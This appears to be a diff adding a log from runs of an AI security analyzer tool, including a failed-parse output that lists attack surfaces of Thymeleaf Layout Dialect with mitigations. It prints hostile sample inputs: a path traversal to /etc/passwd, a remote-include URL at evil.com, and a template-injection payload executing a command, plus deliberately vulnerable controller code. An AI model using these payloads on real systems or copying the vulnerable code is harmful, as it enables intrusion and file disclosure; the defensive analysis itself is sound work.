@@ -1,0 +1,147 @@
+Unable to find image 'ghcr.io/xvnpw/ai-security-analyzer:latest' locally
+latest: Pulling from xvnpw/ai-security-analyzer
+1f3e46996e29: Pulling fs layer
+dfb81f221332: Pulling fs layer
+69d04f35a207: Pulling fs layer
+5c3947958a83: Pulling fs layer
+b9be2ce5276b: Pulling fs layer
+8b438fc1cd11: Pulling fs layer
+28d645c00242: Pulling fs layer
+921df71b230f: Pulling fs layer
+c457853b6d82: Pulling fs layer
+37e00e2d9431: Pulling fs layer
+d3f883494790: Pulling fs layer
+28d645c00242: Waiting
+921df71b230f: Waiting
+c457853b6d82: Waiting
+37e00e2d9431: Waiting
+d3f883494790: Waiting
+5c3947958a83: Waiting
+b9be2ce5276b: Waiting
+8b438fc1cd11: Waiting
+dfb81f221332: Verifying Checksum
+dfb81f221332: Download complete
+1f3e46996e29: Download complete
+5c3947958a83: Verifying Checksum
+5c3947958a83: Download complete
+69d04f35a207: Verifying Checksum
+69d04f35a207: Download complete
+b9be2ce5276b: Verifying Checksum
+b9be2ce5276b: Download complete
+28d645c00242: Verifying Checksum
+28d645c00242: Download complete
+1f3e46996e29: Pull complete
+8b438fc1cd11: Download complete
+921df71b230f: Verifying Checksum
+921df71b230f: Download complete
+d3f883494790: Verifying Checksum
+d3f883494790: Download complete
+37e00e2d9431: Verifying Checksum
+37e00e2d9431: Download complete
+c457853b6d82: Verifying Checksum
+c457853b6d82: Download complete
+dfb81f221332: Pull complete
+69d04f35a207: Pull complete
+5c3947958a83: Pull complete
+b9be2ce5276b: Pull complete
+8b438fc1cd11: Pull complete
+28d645c00242: Pull complete
+921df71b230f: Pull complete
+c457853b6d82: Pull complete
+37e00e2d9431: Pull complete
+d3f883494790: Pull complete
+Digest: sha256:de5354acec6e1b13185500d521e5a9e27b7ac4e65c267bb3a5c82deb7c8475f5
+Status: Downloaded newer image for ghcr.io/xvnpw/ai-security-analyzer:latest
+2025-02-11 18:11:23,376 - __main__ - INFO - Starting AI Security Analyzer
+2025-02-11 18:11:23,441 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 1 of 1
+2025-02-11 18:12:33,547 - ai_security_analyzer.graphs - INFO - Actual token usage: 10666
+2025-02-11 18:12:33,551 - __main__ - INFO - AI Security Analyzer completed successfully
+WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
+E0000 00:00:1739297555.929477       1 init.cc:232] grpc_wait_for_shutdown_with_timeout() timed out.
+2025-02-11 18:12:40,414 - __main__ - INFO - Starting AI Security Analyzer
+2025-02-11 18:12:40,477 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 1 of 3
+2025-02-11 18:13:02,159 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 2 of 3
+2025-02-11 18:13:23,314 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 3 of 3
+2025-02-11 18:15:24,361 - ai_security_analyzer.graphs - INFO - Actual token usage: 23079
+2025-02-11 18:15:24,369 - __main__ - INFO - AI Security Analyzer completed successfully
+WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
+E0000 00:00:1739297726.752972       1 init.cc:232] grpc_wait_for_shutdown_with_timeout() timed out.
+2025-02-11 18:15:31,141 - __main__ - INFO - Starting AI Security Analyzer
+2025-02-11 18:15:31,200 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 1 of 3
+2025-02-11 18:15:55,019 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 2 of 3
+2025-02-11 18:16:20,352 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 3 of 3
+2025-02-11 18:17:17,074 - langchain_google_genai.chat_models - WARNING - Retrying langchain_google_genai.chat_models._chat_with_retry.<locals>._chat_with_retry in 2.0 seconds as it raised ResourceExhausted: 429 Resource has been exhausted (e.g. check quota)..
+2025-02-11 18:17:19,103 - ai_security_analyzer.graphs - ERROR - Graph execution failed: 429 Resource has been exhausted (e.g. check quota).
+2025-02-11 18:17:19,105 - __main__ - ERROR - Application error: 429 Resource has been exhausted (e.g. check quota).. You can try to run with --resume to resume from last checkpoint.
+WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
+E0000 00:00:1739297841.454871       1 init.cc:232] grpc_wait_for_shutdown_with_timeout() timed out.
+2025-02-11 18:17:35,811 - __main__ - INFO - Starting AI Security Analyzer
+2025-02-11 18:17:35,875 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 1 of 3
+2025-02-11 18:17:58,602 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 2 of 3
+2025-02-11 18:17:58,636 - langchain_google_genai.chat_models - WARNING - Retrying langchain_google_genai.chat_models._chat_with_retry.<locals>._chat_with_retry in 2.0 seconds as it raised ResourceExhausted: 429 Resource has been exhausted (e.g. check quota)..
+2025-02-11 18:18:26,449 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 3 of 3
+2025-02-11 18:19:00,256 - ai_security_analyzer.graphs - ERROR - Graph execution failed: Invalid json output: ```json
+{
+  "attack_surfaces": [
+    {
+      "title": "1. Unvalidated Fragment Inclusion (LFI/RFI/SSTI)",
+      "text": " *   **Description:**  The application dynamically determines which layout fragments to include based on user-supplied input without sufficient validation or sanitization. This is the *core* vulnerability directly resulting from how the layout dialect includes files.\n    *   **How Thymeleaf-Layout-Dialect Contributes:** The dialect's `layout:decorate`, `layout:replace`, `th:include`, and `th:replace` directives are *the mechanism* for including fragments. If the *target* of these directives (the fragment name/path) is derived from unvalidated user input, this vulnerability is created. This is a *direct* consequence of the dialect's functionality.\n    *   **Example:**\n        ```java\n        // Controller (Vulnerable)\n        @GetMapping(\"/page\")\n        public String showPage(@RequestParam(\"template\") String templateName, Model model) {\n            model.addAttribute(\"templateToInclude\", templateName);\n            return \"main-layout\"; // Uses layout:decorate=\"~{${templateToInclude}}\"\n        }\n        ```\n        An attacker could use `/page?template=../../../etc/passwd` (LFI) or, if external URLs are somehow enabled, `/page?template=http://evil.com/malicious.html` (RFI).\n    *   **Impact:**\n        *   **LFI:** Exposure of sensitive files (configuration, source code, etc.).\n        *   **RFI:** Execution of arbitrary code from a remote server (less common, but possible if the dialect is misconfigured to allow external resources).\n        *   **SSTI:** Execution of arbitrary server-side code (if the *content* of the included fragment, even if the path is valid, contains attacker-controlled expressions).\n    *   **Risk Severity:** **Critical**\n    *   **Mitigation Strategies:**\n        *   **Whitelist (Mandatory):**  Maintain a strict whitelist of allowed fragment names.  *Never* directly use user input to construct the fragment path. Use a lookup table or similar mechanism.\n            ```java\n            List<String> allowedFragments = Arrays.asList(\"home\", \"about\", \"contact\");\n            if (allowedFragments.contains(templateName)) {\n                model.addAttribute(\"templateToInclude\", templateName);\n            } else {\n                // Handle error (e.g., return a 404 or default fragment)\n            }\n            ```\n        *   **Input Validation (Only if Whitelist is Absolutely Impossible - Highly Discouraged):** If, and *only if*, a whitelist is completely impossible (very rare and a bad design), use an extremely restrictive regular expression: `^[a-zA-Z0-9_-]+$`.  *Never* allow path traversal characters (`.`, `/`, `\\`).  This is significantly less secure than a whitelist.\n        *   **Avoid User Input in Fragment Names:** The best mitigation is to completely avoid using user input in determining which fragment to include.  Use server-side logic based on application state, user roles, etc."
+    },
+    {
+      "title": "2. Fragment Parameter Injection (SSTI) - *Specifically via Layout Dialect Parameter Passing*",
+      "text": "    *   **Description:** User-supplied input is used *directly* within the parameters passed to layout fragments via the dialect's mechanisms, and these parameters are then used within Thymeleaf expressions without proper escaping.  This is distinct from general Thymeleaf SSTI; it's specifically about how the *layout dialect* passes parameters.\n    *   **How Thymeleaf-Layout-Dialect Contributes:** The dialect provides the syntax for passing parameters to fragments (e.g., `<div layout:fragment=\"myFragment(param1=${userInput})\">` or `<div layout:replace=\"~{::myFragment(message=${userInput})}\">`).  This parameter passing is the *direct* vector for the injection.\n    *   **Example:**\n        ```html\n        <!-- Layout Fragment -->\n        <div layout:fragment=\"myFragment(message)\">\n            <p th:text=\"${message}\"></p>\n        </div>\n\n        <!-- Calling Template (Vulnerable) -->\n        <div layout:replace=\"~{::myFragment(message=${userInput})}\"></div>\n        ```\n        If `userInput` is `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x`, this could execute the `id` command.  The vulnerability is *directly* in how the layout dialect handles the parameter.\n    *   **Impact:** Server-Side Template Injection (SSTI), leading to arbitrary code execution.\n    *   **Risk Severity:** **Critical**\n    *   **Mitigation Strategies:**\n        *   **Contextual Escaping:** While Thymeleaf's contextual escaping is important, it's not a *direct* mitigation for the layout dialect's role. The core issue is the *unvalidated parameter passing*.\n        *   **Input Validation (Necessary but Not Sufficient):** Validate and sanitize *all* user input before it's even considered for use as a parameter.  This is crucial, but the *primary* mitigation is below.\n        *   **Parameterize at Controller Level (Crucial):**  *Never* pass raw user input directly to the layout dialect's parameter mechanism.  Process the input in the controller and pass *safe, pre-processed values*.\n            ```java\n            // Controller\n            String safeMessage = sanitize(userInput); // Implement a robust sanitize() method\n            model.addAttribute(\"safeMessage\", safeMessage);\n\n            // Template\n            <div layout:replace=\"~{::myFragment(message=${safeMessage})}\"></div>\n            ```\n            This breaks the direct link between user input and the layout dialect's parameter, preventing the injection."
+    },
+    {
+      "title": "3. Logic Bypass via Fragment Parameters - *Specifically via Layout Dialect Parameter Passing*",
+      "text": "    *   **Description:** Attackers manipulate parameters passed to fragments *using the layout dialect's syntax* to alter the intended logic flow within the fragment, bypassing security checks. This is distinct from general logic bypass; it's about the *layout dialect's* role in enabling it.\n    *   **How Thymeleaf-Layout-Dialect Contributes:** The dialect's parameter passing mechanism (e.g., `<div layout:fragment=\"adminPanel(showAdminFeatures=${userInput})}">`) is the *direct* enabler of this attack. The attacker is exploiting the way the dialect passes values to control fragment logic.\n    *   **Example:**\n        ```html\n          <!-- Layout Fragment -->\n          <div layout:fragment=\"adminPanel(showAdminFeatures)\">\n              <div th:if=\"${showAdminFeatures}\">\n                  <!-- Sensitive admin controls -->\n              </div>\n          </div>\n\n          <!-- Calling Template (Vulnerable) -->\n          <div layout:replace=\"~{::adminPanel(showAdminFeatures=${userInput})}\"></div>\n        ```\n        If `userInput` is normally a boolean set by server-side logic, an attacker might try to set it to `true` via a request parameter to gain access. The layout dialect's parameter passing is the *direct* attack vector.\n    *   **Impact:** Bypass of security controls, unauthorized access to features.\n    *   **Risk Severity:** **High**\n    *   **Mitigation Strategies:**\n        *   **Server-Side Control (Crucial):** *Never* allow user input to directly control sensitive logic flags (like `showAdminFeatures`) that are passed via the layout dialect. These flags should be determined *entirely* by server-side logic based on user roles, authentication, and authorization.\n        *   **Strict Parameter Validation (If unavoidable):** If parameters *must* influence logic (which should be avoided), rigorously validate them against expected types and values *before* they are passed via the layout dialect. Use enums or boolean values where appropriate. The key is to prevent the attacker from controlling the parameter's value *at the point where the layout dialect uses it*."
+    }
+  ]
+}
+```
+For troubleshooting, visit: https://python.langchain.com/docs/troubleshooting/errors/OUTPUT_PARSING_FAILURE 
+2025-02-11 18:19:00,258 - __main__ - ERROR - Application error: Invalid json output: ```json
+{
+  "attack_surfaces": [
+    {
+      "title": "1. Unvalidated Fragment Inclusion (LFI/RFI/SSTI)",
+      "text": " *   **Description:**  The application dynamically determines which layout fragments to include based on user-supplied input without sufficient validation or sanitization. This is the *core* vulnerability directly resulting from how the layout dialect includes files.\n    *   **How Thymeleaf-Layout-Dialect Contributes:** The dialect's `layout:decorate`, `layout:replace`, `th:include`, and `th:replace` directives are *the mechanism* for including fragments. If the *target* of these directives (the fragment name/path) is derived from unvalidated user input, this vulnerability is created. This is a *direct* consequence of the dialect's functionality.\n    *   **Example:**\n        ```java\n        // Controller (Vulnerable)\n        @GetMapping(\"/page\")\n        public String showPage(@RequestParam(\"template\") String templateName, Model model) {\n            model.addAttribute(\"templateToInclude\", templateName);\n            return \"main-layout\"; // Uses layout:decorate=\"~{${templateToInclude}}\"\n        }\n        ```\n        An attacker could use `/page?template=../../../etc/passwd` (LFI) or, if external URLs are somehow enabled, `/page?template=http://evil.com/malicious.html` (RFI).\n    *   **Impact:**\n        *   **LFI:** Exposure of sensitive files (configuration, source code, etc.).\n        *   **RFI:** Execution of arbitrary code from a remote server (less common, but possible if the dialect is misconfigured to allow external resources).\n        *   **SSTI:** Execution of arbitrary server-side code (if the *content* of the included fragment, even if the path is valid, contains attacker-controlled expressions).\n    *   **Risk Severity:** **Critical**\n    *   **Mitigation Strategies:**\n        *   **Whitelist (Mandatory):**  Maintain a strict whitelist of allowed fragment names.  *Never* directly use user input to construct the fragment path. Use a lookup table or similar mechanism.\n            ```java\n            List<String> allowedFragments = Arrays.asList(\"home\", \"about\", \"contact\");\n            if (allowedFragments.contains(templateName)) {\n                model.addAttribute(\"templateToInclude\", templateName);\n            } else {\n                // Handle error (e.g., return a 404 or default fragment)\n            }\n            ```\n        *   **Input Validation (Only if Whitelist is Absolutely Impossible - Highly Discouraged):** If, and *only if*, a whitelist is completely impossible (very rare and a bad design), use an extremely restrictive regular expression: `^[a-zA-Z0-9_-]+$`.  *Never* allow path traversal characters (`.`, `/`, `\\`).  This is significantly less secure than a whitelist.\n        *   **Avoid User Input in Fragment Names:** The best mitigation is to completely avoid using user input in determining which fragment to include.  Use server-side logic based on application state, user roles, etc."
+    },
+    {
+      "title": "2. Fragment Parameter Injection (SSTI) - *Specifically via Layout Dialect Parameter Passing*",
+      "text": "    *   **Description:** User-supplied input is used *directly* within the parameters passed to layout fragments via the dialect's mechanisms, and these parameters are then used within Thymeleaf expressions without proper escaping.  This is distinct from general Thymeleaf SSTI; it's specifically about how the *layout dialect* passes parameters.\n    *   **How Thymeleaf-Layout-Dialect Contributes:** The dialect provides the syntax for passing parameters to fragments (e.g., `<div layout:fragment=\"myFragment(param1=${userInput})\">` or `<div layout:replace=\"~{::myFragment(message=${userInput})}\">`).  This parameter passing is the *direct* vector for the injection.\n    *   **Example:**\n        ```html\n        <!-- Layout Fragment -->\n        <div layout:fragment=\"myFragment(message)\">\n            <p th:text=\"${message}\"></p>\n        </div>\n\n        <!-- Calling Template (Vulnerable) -->\n        <div layout:replace=\"~{::myFragment(message=${userInput})}\"></div>\n        ```\n        If `userInput` is `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x`, this could execute the `id` command.  The vulnerability is *directly* in how the layout dialect handles the parameter.\n    *   **Impact:** Server-Side Template Injection (SSTI), leading to arbitrary code execution.\n    *   **Risk Severity:** **Critical**\n    *   **Mitigation Strategies:**\n        *   **Contextual Escaping:** While Thymeleaf's contextual escaping is important, it's not a *direct* mitigation for the layout dialect's role. The core issue is the *unvalidated parameter passing*.\n        *   **Input Validation (Necessary but Not Sufficient):** Validate and sanitize *all* user input before it's even considered for use as a parameter.  This is crucial, but the *primary* mitigation is below.\n        *   **Parameterize at Controller Level (Crucial):**  *Never* pass raw user input directly to the layout dialect's parameter mechanism.  Process the input in the controller and pass *safe, pre-processed values*.\n            ```java\n            // Controller\n            String safeMessage = sanitize(userInput); // Implement a robust sanitize() method\n            model.addAttribute(\"safeMessage\", safeMessage);\n\n            // Template\n            <div layout:replace=\"~{::myFragment(message=${safeMessage})}\"></div>\n            ```\n            This breaks the direct link between user input and the layout dialect's parameter, preventing the injection."
+    },
+    {
+      "title": "3. Logic Bypass via Fragment Parameters - *Specifically via Layout Dialect Parameter Passing*",
+      "text": "    *   **Description:** Attackers manipulate parameters passed to fragments *using the layout dialect's syntax* to alter the intended logic flow within the fragment, bypassing security checks. This is distinct from general logic bypass; it's about the *layout dialect's* role in enabling it.\n    *   **How Thymeleaf-Layout-Dialect Contributes:** The dialect's parameter passing mechanism (e.g., `<div layout:fragment=\"adminPanel(showAdminFeatures=${userInput})}">`) is the *direct* enabler of this attack. The attacker is exploiting the way the dialect passes values to control fragment logic.\n    *   **Example:**\n        ```html\n          <!-- Layout Fragment -->\n          <div layout:fragment=\"adminPanel(showAdminFeatures)\">\n              <div th:if=\"${showAdminFeatures}\">\n                  <!-- Sensitive admin controls -->\n              </div>\n          </div>\n\n          <!-- Calling Template (Vulnerable) -->\n          <div layout:replace=\"~{::adminPanel(showAdminFeatures=${userInput})}\"></div>\n        ```\n        If `userInput` is normally a boolean set by server-side logic, an attacker might try to set it to `true` via a request parameter to gain access. The layout dialect's parameter passing is the *direct* attack vector.\n    *   **Impact:** Bypass of security controls, unauthorized access to features.\n    *   **Risk Severity:** **High**\n    *   **Mitigation Strategies:**\n        *   **Server-Side Control (Crucial):** *Never* allow user input to directly control sensitive logic flags (like `showAdminFeatures`) that are passed via the layout dialect. These flags should be determined *entirely* by server-side logic based on user roles, authentication, and authorization.\n        *   **Strict Parameter Validation (If unavoidable):** If parameters *must* influence logic (which should be avoided), rigorously validate them against expected types and values *before* they are passed via the layout dialect. Use enums or boolean values where appropriate. The key is to prevent the attacker from controlling the parameter's value *at the point where the layout dialect uses it*."
+    }
+  ]
+}
+```
+For troubleshooting, visit: https://python.langchain.com/docs/troubleshooting/errors/OUTPUT_PARSING_FAILURE . You can try to run with --resume to resume from last checkpoint.
+WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
+E0000 00:00:1739297942.644394       1 init.cc:232] grpc_wait_for_shutdown_with_timeout() timed out.
+2025-02-11 18:19:17,136 - __main__ - INFO - Starting AI Security Analyzer
+2025-02-11 18:19:17,202 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 1 of 3
+2025-02-11 18:19:42,625 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 2 of 3
+2025-02-11 18:20:08,724 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 3 of 3
+2025-02-11 18:22:27,677 - ai_security_analyzer.graphs - INFO - Actual token usage: 26441
+2025-02-11 18:22:27,685 - __main__ - INFO - AI Security Analyzer completed successfully
+WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
+E0000 00:00:1739298150.091914       1 init.cc:232] grpc_wait_for_shutdown_with_timeout() timed out.
+2025-02-11 18:22:34,591 - __main__ - INFO - Starting AI Security Analyzer
+2025-02-11 18:22:34,652 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 1 of 4
+2025-02-11 18:22:56,594 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 2 of 4
+2025-02-11 18:23:12,256 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 3 of 4
+2025-02-11 18:23:24,827 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 4 of 4
+2025-02-11 18:25:02,696 - ai_security_analyzer.graphs - INFO - Actual token usage: 27659
+2025-02-11 18:25:02,705 - __main__ - INFO - AI Security Analyzer completed successfully
+WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
+E0000 00:00:1739298305.032013       1 init.cc:232] grpc_wait_for_shutdown_with_timeout() timed out.
+2025-02-11 18:25:09,391 - __main__ - INFO - Starting AI Security Analyzer
+2025-02-11 18:25:09,450 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 1 of 3
+2025-02-11 18:25:27,418 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 2 of 3
+2025-02-11 18:26:02,158 - ai_security_analyzer.github2_deep_base_agents - INFO - Running internal step 3 of 3
+2025-02-11 18:27:21,079 - ai_security_analyzer.graphs - INFO - Actual token usage: 21978
+2025-02-11 18:27:21,086 - __main__ - INFO - AI Security Analyzer completed successfully
+WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
+E0000 00:00:1739298443.459645       1 init.cc:232] grpc_wait_for_shutdown_with_timeout() timed out.
